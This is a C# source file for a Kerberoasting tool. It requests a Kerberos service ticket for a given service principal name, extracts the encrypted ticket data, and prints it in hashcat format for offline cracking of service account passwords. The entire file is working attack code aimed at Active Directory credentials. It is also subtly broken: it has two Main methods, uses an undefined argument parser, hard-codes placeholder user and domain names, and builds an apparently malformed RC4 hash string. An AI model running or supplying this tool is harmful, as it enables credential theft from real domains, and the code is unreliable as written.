using System;
using Asn1;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.DirectoryServices.AccountManagement;
using System.IdentityModel.Selectors;
using System.IdentityModel.Tokens;

namespace Kerberos
{
    class Program
    {
        static byte[] GetToken(string spn)
        {
            string domain = System.Environment.UserDomainName;
            using (var domainContext = new PrincipalContext(ContextType.Domain, domain))
            {
                using (var foundUser = UserPrincipal.FindByIdentity(domainContext, IdentityType.SamAccountName, spn))
                {
                    KerberosSecurityTokenProvider K1 = new KerberosSecurityTokenProvider(spn);
                    KerberosRequestorSecurityToken T1 = K1.GetToken(TimeSpan.FromMinutes(1)) as KerberosRequestorSecurityToken;
                    byte[] requestBytes = T1.GetRequest();
                    return requestBytes;
                }
            }
        }
        static int Kerberoasting(string servicePrincipalName)
        {
            try
            {
                string encryptionType, hashcatFormat;
                string userName = "userName";
                string domainName = "domainName";
                long encTypeToken = 0;

                byte[] token = GetToken(servicePrincipalName), apRequest = new byte[token.Length - 17];
                Array.Copy(token, 17, apRequest, 0, token.Length - 17);
                AsnElt apRep = AsnElt.Decode(apRequest);

                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encTypeToken = elem3.Sub[0].GetInteger();
                                    }
                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        if (encTypeToken == 17)
                                        {
                                            encryptionType = "aes128-cts-hmac-sha1-96";
                                            hashcatFormat = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encTypeToken, userName, domainName, servicePrincipalName, cipherText.Substring(0, 32), cipherText.Substring(32));
                                            Console.WriteLine("> Encryption Type..........:" + encryptionType);
                                            Console.WriteLine("> Service Principal Name...:" + servicePrincipalName);
                                            Console.WriteLine("> Domain name..............:" + System.Environment.UserDomainName);
                                            Console.WriteLine("> Hash.....................:" + cipherText.Substring(0, 32) + cipherText.Substring(32));
                                            Console.WriteLine("");
                                            Console.WriteLine("> Hashcat Format...........:" + hashcatFormat);
                                        }
                                        if (encTypeToken == 18)
                                        {
                                            encryptionType = "aes256-cts-hmac-sha1-96";
                                            hashcatFormat = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encTypeToken, userName, domainName, servicePrincipalName, cipherText.Substring(0, 32), cipherText.Substring(32));
                                            Console.WriteLine("> Encryption Type..........:" + encryptionType);
                                            Console.WriteLine("> Service Principal Name...:" + servicePrincipalName);
                                            Console.WriteLine("> Domain name..............:" + System.Environment.UserDomainName);
                                            Console.WriteLine("> Hash.....................:" + cipherText.Substring(0, 32) + cipherText.Substring(32));
                                            Console.WriteLine("");
                                            Console.WriteLine("> Hashcat Format...........:" + hashcatFormat);
                                        }
                                        if (encTypeToken == 23)
                                        {
                                            encryptionType = "rc4-hmac";
                                            int checksumStart = cipherText.Length - 24;
                                            hashcatFormat = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encTypeToken, userName, domainName, servicePrincipalName, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                            Console.WriteLine("> Encryption Type..........:" + encryptionType);
                                            Console.WriteLine("> Service Principal Name...:" + servicePrincipalName);
                                            Console.WriteLine("> Domain name..............:" + System.Environment.UserDomainName);
                                            Console.WriteLine("> Hash.....................:" + cipherText.Substring(checksumStart) + cipherText.Substring(0, checksumStart));
                                            Console.WriteLine("");
                                            Console.WriteLine("> Hashcat Format...........:" + hashcatFormat);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return 0;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return 1;
            }
        }
        static int Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
                .WithParsed<Options>(o =>
                {
                    Kerberoasting(o.ServicePrincipalName);
                });
            return 0;
        }
        static void Main(string[] args)
        {
        }
    }
}
